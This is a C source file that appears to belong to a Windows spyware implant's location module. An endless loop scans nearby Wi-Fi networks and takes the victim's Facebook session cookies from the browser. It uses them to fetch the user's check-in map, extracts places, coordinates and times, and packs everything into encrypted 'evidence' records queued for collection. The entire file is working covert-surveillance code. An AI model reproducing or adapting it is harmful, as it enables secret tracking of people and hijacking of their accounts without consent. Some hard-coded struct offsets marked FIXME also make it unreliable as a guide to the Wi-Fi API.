#include <Windows.h>

#include "globals.h"
#include "zmem.h"
#include "utils.h"
#include "conf.h"
#include "proto.h"
#include "position.h"
#include "debug.h"
#include "JSON.h"
#include "JSONValue.h"
#include "social.h"
#include "facebook.h"
#include "cookies.h"

POSITION_LOGS lpPositionLogs[MAX_POSITION_QUEUE];

/* wifi definition */
#define TYPE_LOCATION_WIFI 3

typedef struct _wifiloc_param_struct {
	DWORD interval;
	DWORD unused;
} wifiloc_param_struct;

typedef struct _location_additionalheader_struct {
#define LOCATION_HEADER_VERSION 2010082401
	DWORD version;
	DWORD type;
	DWORD number_of_items;
} location_additionalheader_struct;

typedef struct _wifiloc_data_struct {
    UCHAR MacAddress[6];    // BSSID
	CHAR cPadd[2];
    UINT uSsidLen;          // SSID length
    UCHAR Ssid[32];         // SSID
    INT iRssi;              // Received signal 
} wifiloc_data_struct;

#include <wlanapi.h>
typedef DWORD (WINAPI *WlanOpenHandle_t) (DWORD, PVOID, PDWORD, PHANDLE);
typedef DWORD (WINAPI *WlanCloseHandle_t) (HANDLE, PVOID);
typedef DWORD (WINAPI *WlanEnumInterfaces_t) (HANDLE, PVOID, PWLAN_INTERFACE_INFO_LIST *);
typedef DWORD (WINAPI *WlanGetNetworkBssList_t) (HANDLE, const GUID *, const PDOT11_SSID, DOT11_BSS_TYPE, BOOL, PVOID, PWLAN_BSS_LIST *);
typedef DWORD (WINAPI *WlanFreeMemory_t) (PVOID);

WlanOpenHandle_t pWlanOpenHandle = NULL;
WlanCloseHandle_t pWlanCloseHandle = NULL;
WlanEnumInterfaces_t pWlanEnumInterfaces = NULL;
WlanGetNetworkBssList_t pWlanGetNetworkBssList = NULL;
WlanFreeMemory_t pWlanFreeMemory = NULL;


/* gps definition */

#define TYPE_LOCATION_GPS 1
#define GPS_MAX_SATELLITES      12

//
// GPS_VALID_XXX bit flags in GPS_POSITION structure are valid.
//
#define GPS_VALID_UTC_TIME                                 0x00000001
#define GPS_VALID_LATITUDE                                 0x00000002
#define GPS_VALID_LONGITUDE                                0x00000004
#define GPS_VALID_SPEED                                    0x00000008
#define GPS_VALID_HEADING                                  0x00000010
#define GPS_VALID_MAGNETIC_VARIATION                       0x00000020
#define GPS_VALID_ALTITUDE_WRT_SEA_LEVEL                   0x00000040
#define GPS_VALID_ALTITUDE_WRT_ELLIPSOID                   0x00000080
#define GPS_VALID_POSITION_DILUTION_OF_PRECISION           0x00000100
#define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION         0x00000200
#define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION           0x00000400
#define GPS_VALID_SATELLITE_COUNT                          0x00000800
#define GPS_VALID_SATELLITES_USED_PRNS                     0x00001000
#define GPS_VALID_SATELLITES_IN_VIEW                       0x00002000
#define GPS_VALID_SATELLITES_IN_VIEW_PRNS                  0x00004000
#define GPS_VALID_SATELLITES_IN_VIEW_ELEVATION             0x00008000
#define GPS_VALID_SATELLITES_IN_VIEW_AZIMUTH               0x00010000
#define GPS_VALID_SATELLITES_IN_VIEW_SIGNAL_TO_NOISE_RATIO 0x00020000

//
// GPS_DATA_FLAGS_XXX bit flags set in GPS_POSITION dwFlags field
// provide additional information about the state of the query.
// 

// Set when GPS hardware is not connected to GPSID and we 
// are returning cached data.
#define GPS_DATA_FLAGS_HARDWARE_OFF                        0x00000001

typedef enum {
	GPS_FIX_UNKNOWN = 0,
	GPS_FIX_2D,
	GPS_FIX_3D
}
GPS_FIX_TYPE;

typedef enum {
	GPS_FIX_SELECTION_UNKNOWN = 0,
	GPS_FIX_SELECTION_AUTO,
	GPS_FIX_SELECTION_MANUAL
}
GPS_FIX_SELECTION;

typedef enum {
	GPS_FIX_QUALITY_UNKNOWN = 0,
	GPS_FIX_QUALITY_GPS,
	GPS_FIX_QUALITY_DGPS
}
GPS_FIX_QUALITY;

typedef struct _GPS_POSITION {
        DWORD dwVersion;             // Current version of GPSID client is using.
        DWORD dwSize;                // sizeof(_GPS_POSITION)

        // Not all fields in the structure below are guaranteed to be valid.  
        // Which fields are valid depend on GPS device being used, how stale the API allows
        // the data to be, and current signal.
        // Valid fields are specified in dwValidFields, based on GPS_VALID_XXX flags.
        DWORD dwValidFields;

        // Additional information about this location structure (GPS_DATA_FLAGS_XXX)
#define FACEBOOK_CHECK_IN 0x1
        DWORD dwFlags;
        
        //** Time related
        SYSTEMTIME stUTCTime;   //  UTC according to GPS clock.
        
        //** Position + heading related
        double dblLatitude;            // Degrees latitude.  North is positive
        double dblLongitude;           // Degrees longitude.  East is positive
        float  flSpeed;                // Speed in knots
        float  flHeading;              // Degrees heading (course made good).  True North=0
        double dblMagneticVariation;   // Magnetic variation.  East is positive
        float  flAltitudeWRTSeaLevel;  // Altitute with regards to sea level, in meters
        float  flAltitudeWRTEllipsoid; // Altitude with regards to ellipsoid, in meters

        ////** Quality of this fix
        GPS_FIX_QUALITY     FixQuality;        // Where did we get fix from?
        GPS_FIX_TYPE        FixType;           // Is this 2d or 3d fix?
        GPS_FIX_SELECTION   SelectionType;     // Auto or manual selection between 2d or 3d mode
        float flPositionDilutionOfPrecision;   // Position Dilution Of Precision
        float flHorizontalDilutionOfPrecision; // Horizontal Dilution Of Precision
        float flVerticalDilutionOfPrecision;   // Vertical Dilution Of Precision

        ////** Satellite information -- name here
        DWORD dwSatelliteCount;                                            // Number of satellites used in solution
        DWORD rgdwSatellitesUsedPRNs[GPS_MAX_SATELLITES];                  // PRN numbers of satellites used in the solution

        DWORD dwSatellitesInView;                                          // Number of satellites in view.  From 0-GPS_MAX_SATELLITES
        DWORD rgdwSatellitesInViewPRNs[GPS_MAX_SATELLITES];                // PRN numbers of satellites in view
        DWORD rgdwSatellitesInViewElevation[GPS_MAX_SATELLITES];           // Elevation of each satellite in view
        DWORD rgdwSatellitesInViewAzimuth[GPS_MAX_SATELLITES];             // Azimuth of each satellite in view
        DWORD rgdwSatellitesInViewSignalToNoiseRatio[GPS_MAX_SATELLITES];  // Signal to noise ratio of each satellite in view
} GPS_POSITION, *PGPS_POSITION;

typedef struct _gps_data_struct {
	DWORD dwFail;
	UINT uSize;
#define GPS_VERSION (UINT)2008121901
	UINT uVersion;
	FILETIME ft;
	GPS_POSITION gps;
#define LOG_DELIMITER 0xABADC0DE
	DWORD dwDelimiter;
} gps_data_struct;



/* methods */
BOOL ResolveWLANAPISymbols()
{
	static HMODULE hwlanapi = NULL;

	if (!hwlanapi)
		hwlanapi = LoadLibrary(L"wlanapi.dll");
	if (!hwlanapi)
		return FALSE;

	if (!pWlanOpenHandle)
		pWlanOpenHandle = (WlanOpenHandle_t)GetProcAddress(hwlanapi, "WlanOpenHandle");  //FIXME: array

	if (!pWlanCloseHandle)
		pWlanCloseHandle = (WlanCloseHandle_t)GetProcAddress(hwlanapi, "WlanCloseHandle");  //FIXME: array

	if (!pWlanEnumInterfaces)
		pWlanEnumInterfaces = (WlanEnumInterfaces_t)GetProcAddress(hwlanapi, "WlanEnumInterfaces");  //FIXME: array

	if (!pWlanGetNetworkBssList)
		pWlanGetNetworkBssList = (WlanGetNetworkBssList_t)GetProcAddress(hwlanapi, "WlanGetNetworkBssList");  //FIXME: array

	if (!pWlanFreeMemory)
		pWlanFreeMemory = (WlanFreeMemory_t)GetProcAddress(hwlanapi, "WlanFreeMemory");  //FIXME: array

	if (pWlanOpenHandle && pWlanCloseHandle && pWlanEnumInterfaces && pWlanGetNetworkBssList && pWlanFreeMemory)
		return TRUE;

	return FALSE;
}

BOOL EnumWifiNetworks(location_additionalheader_struct *wifiloc_additionaheader, BYTE **body, DWORD *blen)
{
    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;       
    DWORD dwCurVersion = 0;
	DWORD i, j;
	wifiloc_data_struct *wifiloc_data;
    
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
	PWLAN_INTERFACE_INFO pIfInfo = NULL;
	PWLAN_BSS_LIST pBssList = NULL;
	PWLAN_BSS_ENTRY pBss = NULL;

	*body = NULL;
	*blen = 0;
		
	wifiloc_additionaheader->version = LOCATION_HEADER_VERSION;
	wifiloc_additionaheader->type = TYPE_LOCATION_WIFI;
	wifiloc_additionaheader->number_of_items = 0;
		
	if (!ResolveWLANAPISymbols())
		return FALSE;
    
    if (pWlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient) != ERROR_SUCCESS)  
		return FALSE;
    
    if (pWlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS)  {
		pWlanCloseHandle(hClient, NULL);
		return FALSE;
    }

	// Enumera le interfacce wifi disponibili
	for (i=0; i<pIfList->dwNumberOfItems; i++) 
	{
		pIfInfo = (WLAN_INTERFACE_INFO *) &pIfList->InterfaceInfo[i];

		if (pWlanGetNetworkBssList(hClient, &pIfInfo->InterfaceGuid, NULL, dot11_BSS_type_infrastructure, FALSE, NULL, &pBssList) == ERROR_SUCCESS) 
		{
			// Ha trovato un interfaccia valida ed enumera le reti wifi
			// alloca l'array di strutture di ritorno
			if (!(*body = (LPBYTE)calloc(pBssList->dwNumberOfItems, sizeof(wifiloc_data_struct))))
				break;

			*blen = pBssList->dwNumberOfItems * sizeof(wifiloc_data_struct);
			wifiloc_additionaheader->number_of_items = pBssList->dwNumberOfItems;
			wifiloc_data = (wifiloc_data_struct *)*body;
			
			// Valorizza con i ssid
			PWLAN_BSS_ENTRY pBss = pBssList->wlanBssEntries;
			for (j=0; j<pBssList->dwNumberOfItems; j++) 
			{
						
				memcpy(wifiloc_data[j].MacAddress, pBss->dot11Bssid, 6);
				wifiloc_data[j].uSsidLen = pBss->dot11Ssid.uSSIDLength;
				if (wifiloc_data[j].uSsidLen>32)
					wifiloc_data[j].uSsidLen = 32; // limite massimo del SSID
				memcpy(wifiloc_data[j].Ssid, pBss->dot11Ssid.ucSSID, wifiloc_data[j].uSsidLen);
				wifiloc_data[j].iRssi = pBss->lRssi;
				
				pBss = (PWLAN_BSS_ENTRY)(((PBYTE)pBss) + 0x168); // FIXME
			}
			
			break;
		} 
	}

	if (pBssList != NULL)
		pWlanFreeMemory(pBssList);
    if (pIfList != NULL) 
        pWlanFreeMemory(pIfList);
	pWlanCloseHandle(hClient, NULL);
    
    return TRUE;
}


/*
	Description:	given a json object containing Facebook places, extracts and packs data into additionalheader and body
	Parameters:		json object, pointer to additionalheader, body that will contain the payload, pointer to size of body, Facebook user id
	Usage:			return true there're data to log, false otherwise. Body is allocated and must be freed by the caller
*/
BOOL FacebookPlacesExtractPosition(__in JSONValue *jValue, __out location_additionalheader_struct *additionalheader, __out BYTE **body, __out DWORD *blen, __in LPSTR strUserId )
{
		
	*body = NULL;
	*blen = 0;
	additionalheader->version = LOCATION_HEADER_VERSION;
	additionalheader->type    = TYPE_LOCATION_GPS;
	additionalheader->number_of_items = 0;

	/* get last place timestamp */
	DWORD dwHighestBatchTimestamp = 0;
	CHAR strUsernameForPlaces[512];
	_snprintf_s(strUsernameForPlaces, sizeof(strUsernameForPlaces), _TRUNCATE, "%s-facebookplaces", strUserId);
	DWORD dwLastTimestampLow, dwLastTimestampHigh;
	dwLastTimestampLow = SocialGetLastTimestamp(strUsernameForPlaces, &dwLastTimestampHigh);
	if (dwLastTimestampLow == SOCIAL_INVALID_MESSAGE_ID)
		return FALSE;

	/* get the number of locations */
	JSONObject jRoot = jValue->AsObject();
	if (jRoot.find(L"jsmods") != jRoot.end() && jRoot[L"jsmods"]->IsObject())
	{
		JSONObject jJsmods = jRoot[L"jsmods"]->AsObject();

		if (jJsmods.find(L"require") != jJsmods.end() && jJsmods[L"require"]->IsArray())
		{
			JSONArray jRequire = jJsmods[L"require"]->AsArray();

			if ( jRequire.size() > 0 && jRequire.at(0)->IsArray())
			{
				JSONArray jTmp = jRequire.at(0)->AsArray();
				if (jTmp.size() > 3 && jTmp.at(3)->IsArray())
				{
					JSONArray jTmp2 = jTmp.at(3)->AsArray();

					if (jTmp2.size() > 1 && jTmp2.at(1)->IsObject())
					{
						JSONObject jObj = jTmp2.at(1)->AsObject();
						

						/* jObj contains:
						"stories":[ array with timestamps ],
						"places":[ array with places ],
						"count":4, // number of different places
						"_instanceid":"u_0_44"
						*/

						if ((jObj[L"places"]->IsArray() && jObj[L"places"]->IsArray()) && (jObj[L"stories"]->IsArray() && jObj[L"stories"]->IsArray()))
						{
							JSONArray jPlaces = jObj[L"places"]->AsArray();
							JSONArray jStories = jObj[L"stories"]->AsArray();

							/*  stories element example: {"timestamp":1418910342, .. ,"placeID":133355006713850, ..  }
								places element example:  {"id":133355006713850, "name":"Isle of Skye, Scotland, UK","latitude":57.41219383264, "longitude":-6.1920373066084,"city":814578, "country":"GB"   } 
							*/

							/* loop through stories, for each story find the corresponding place and set the gps record (suboptimal..) */
							for (DWORD i=0; i<jStories.size(); i++)
							{
								if (!jStories.at(i)->IsObject())
									continue;

								UINT64 current_id;
								time_t time = 0;

								/* extract story id and timestamp */
								JSONObject jStory = jStories.at(i)->AsObject();
								if (jStory.find(L"placeID") != jStory.end() && jStory[L"placeID"]->IsNumber())
								{
									current_id = (UINT64) jStory[L"placeID"]->AsNumber();
								}
								
								if (jStory.find(L"timestamp") != jStory.end() && jStory[L"timestamp"]->IsNumber())
								{
									 time = (time_t) jStory[L"timestamp"]->AsNumber();
								}

								
								/* save the most recent timestamp for this batch */
								if (time > dwHighestBatchTimestamp)
									dwHighestBatchTimestamp = time;
								
								/* if it's recent save it otherwise skip this record */
								if (time <= dwLastTimestampLow)
									continue;

								/* find place id in places: suboptimal version loop through each time */
								for (DWORD j=0; j<jPlaces.size(); j++)
								{
									if (!jPlaces.at(j)->IsObject())
										continue;

									UINT64 tmp_id;

									JSONObject jPlace = jPlaces.at(j)->AsObject();
									if (jPlace.find(L"id") != jPlace.end() && jPlace[L"id"]->IsNumber())
									{
										tmp_id = (UINT64) jPlace[L"id"]->AsNumber();

										if (tmp_id == current_id)
										{
											/* got our guy, fill a gps position record */
#ifdef _DEBUG
											OutputDebug(L"[*] Got %I64u\n", tmp_id);
											OutputDebug( L"Time in seconds since UTC 1/1/70:\t%ld\n", time );
#endif
											/* update additional header, body size */
											additionalheader->number_of_items += 1;
											DWORD dwBodySize = additionalheader->number_of_items * sizeof(gps_data_struct);
											*body = (LPBYTE) realloc(*body, dwBodySize);
											if (!*body)
												return FALSE;

											*blen = _msize(*body);

											gps_data_struct  *record = (gps_data_struct*)( *body + ( dwBodySize - sizeof(gps_data_struct) ));
											SecureZeroMemory(record, sizeof(gps_data_struct));

											/* fill GPS_POSITION */
											record->gps.dwVersion = 1 ;// dunno
											record->gps.dwSize = sizeof(GPS_POSITION);
											record->gps.dwValidFields = GPS_VALID_UTC_TIME | GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE;
											record->gps.dwFlags = FACEBOOK_CHECK_IN;
											UnixTimeToSystemTime(time, &record->gps.stUTCTime);
																						

											if (jPlace.find(L"latitude") != jPlace.end() && jPlace[L"latitude"]->IsNumber())
											{
												record->gps.dblLatitude = jPlace[L"latitude"]->AsNumber();
											}
											
											if (jPlace.find(L"longitude") != jPlace.end() && jPlace[L"longitude"]->IsNumber())
											{
												record->gps.dblLongitude = jPlace[L"longitude"]->AsNumber();
											}

											if (jPlace.find(L"name") != jPlace.end() && jPlace[L"name"]->IsString())
											{
												/* name is written over the fields starting with dwSatelliteCount: 62 dwords - 1 dword for null */
												//size_t maxNameSize  = 62 * sizeof(DWORD);
												size_t maxNameSize = sizeof(GPS_POSITION) - FIELD_OFFSET(GPS_POSITION, dwSatelliteCount) - 1;
												LPWSTR name = (LPWSTR) zalloc_s(maxNameSize);
												
												_snwprintf_s(name, maxNameSize/2, _TRUNCATE, L"%s", jPlace[L"name"]->AsString().c_str() );
												
												memcpy_s(&record->gps.dwSatelliteCount, maxNameSize, name, lstrlen(name) * 2 + 2);
												record->gps.rgdwSatellitesInViewSignalToNoiseRatio[GPS_MAX_SATELLITES-1] = 0;
												
												zfree_s(name);
											}

											/* fill remaining field of gps_data_struct */
											record->uSize = sizeof(gps_data_struct);
											record->uVersion = GPS_VERSION;
											GetSystemTimeAsFileTime(&record->ft);
											record->gps.flHorizontalDilutionOfPrecision = 100; // needed for intelligence
											record->dwDelimiter = LOG_DELIMITER;
														

											break;
										} //if (tmp_id == current_id)
									} //if (jPlace.find(L"id") != jPlace.end() && jPlace[L"id"]->IsNumber())
								} //for (DWORD j=0; j<jPlaces.size(); j++)
							} //for (DWORD i=0; i<jStories.size(); i++)


							/* save the highest timestamp in the batch */
							if (dwHighestBatchTimestamp > dwLastTimestampLow)
								SocialSetLastTimestamp(strUsernameForPlaces, dwHighestBatchTimestamp, 0);

						} //if ((jObj[L"places"]->IsArray() && jObj[L"places"]->IsArray())
					} //if (jTmp2.size() > 1 && jTmp2.at(1)->IsObject())
				}
			}
		}
	}

	/* 	true if *body is not null, otherwise false */
	return *body != NULL;
}

BOOL QueuePositionLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize)
{
	for (DWORD i=0; i<MAX_POSITION_QUEUE; i++)
	{
		if (lpPositionLogs[i].dwSize == 0 || lpPositionLogs[i].lpBuffer == NULL)
		{
			lpPositionLogs[i].dwSize = dwEvSize;
			lpPositionLogs[i].lpBuffer = lpEvBuff;

			return TRUE;
		}
	}

	return FALSE;
}


/* 
	Description:	extracts and logs Facebook checkin locations
	Params:			valid Facebook cookie
	Usage:			-
*/
VOID FacebookPlacesHandler(LPSTR strCookie)
{

	LPSTR strUserId, strScreenName; 
	LPSTR strParser1, strParser2;
	
	if (!FacebookGetUserInfo(strCookie, &strUserId, &strScreenName))
		return;

	zfree_s(strScreenName);

	LPWSTR strUrl = (LPWSTR) zalloc(2048*sizeof(WCHAR));
	_snwprintf_s(strUrl, 2048, _TRUNCATE, L"/profile.php?id=%S&sk=map", strUserId);
	
	LPSTR strRecvBuffer = NULL;
	DWORD dwBuffSize;
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie); 

	zfree_s(strUrl);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree(strRecvBuffer);
		zfree(strUserId);
		return;
	}

	/* find the snippet of json we're interested in and give it to the parser */
	strParser1 = strstr(strRecvBuffer, "{\"display_dependency\":[\"pagelet_timeline_medley_inner_map\"]");
	if (!strParser1)
	{
		/* cleanup */
		zfree_s(strRecvBuffer);
		zfree_s(strUserId);
		return;
	}

	strParser2 = strstr(strParser1, "})");
	*(strParser2+1) = NULL;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - position json: %S\n", __FUNCTION__, strParser1);
#endif

	LPSTR strJson = strParser1;

	JSONValue *jValue = JSON::Parse(strJson);
	if (jValue != NULL && jValue->IsObject())
	{
		DWORD dwSize;
		LPBYTE lpBody;
		location_additionalheader_struct additionaheader;

		if ( FacebookPlacesExtractPosition(jValue, &additionaheader, &lpBody, &dwSize, strUserId) )
		{
			DWORD dwEvSize;
			LPBYTE lpEvBuffer = PackEncryptEvidence(dwSize, lpBody, PM_LOCATION, (LPBYTE) &additionaheader, sizeof(additionaheader), &dwEvSize);
			zfree_s(lpBody);

			if (!QueuePositionLog(lpEvBuffer, dwEvSize))
				zfree_s(lpEvBuffer);
		}
	}

	/* cleanup */
	zfree_s(strRecvBuffer);
	zfree_s(strUserId);
	if (jValue)
		delete jValue;

	return;
}

VOID PositionMain()
{
	while (1)
	{
		if (bPositionThread == FALSE)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] PositionMain exiting\n");
#endif
			hPositionThread = NULL;
			return;
		}

		if (bCollectEvidences)
		{

			/* 1] wifi */
			DWORD dwSize;
			LPBYTE lpBody;
			location_additionalheader_struct wifi;

			if(EnumWifiNetworks(&wifi, &lpBody, &dwSize))
			{
				DWORD dwEvSize;
				LPBYTE lpEvBuffer = PackEncryptEvidence(dwSize, lpBody, PM_LOCATION, (LPBYTE)&wifi, sizeof(wifi), &dwEvSize);
				zfree(lpBody);

				if (!QueuePositionLog(lpEvBuffer, dwEvSize))
					zfree(lpEvBuffer);
			}

			/* 2] facebook places */
			LPSTR strFacebookCookies = GetCookieString(FACEBOOK_DOMAIN);
			if (strFacebookCookies)
			{
				FacebookPlacesHandler(strFacebookCookies);
				zfree(strFacebookCookies);

			}

			
		}

		MySleep(ConfGetRepeat(L"position"));  //FIXME: array
	}
}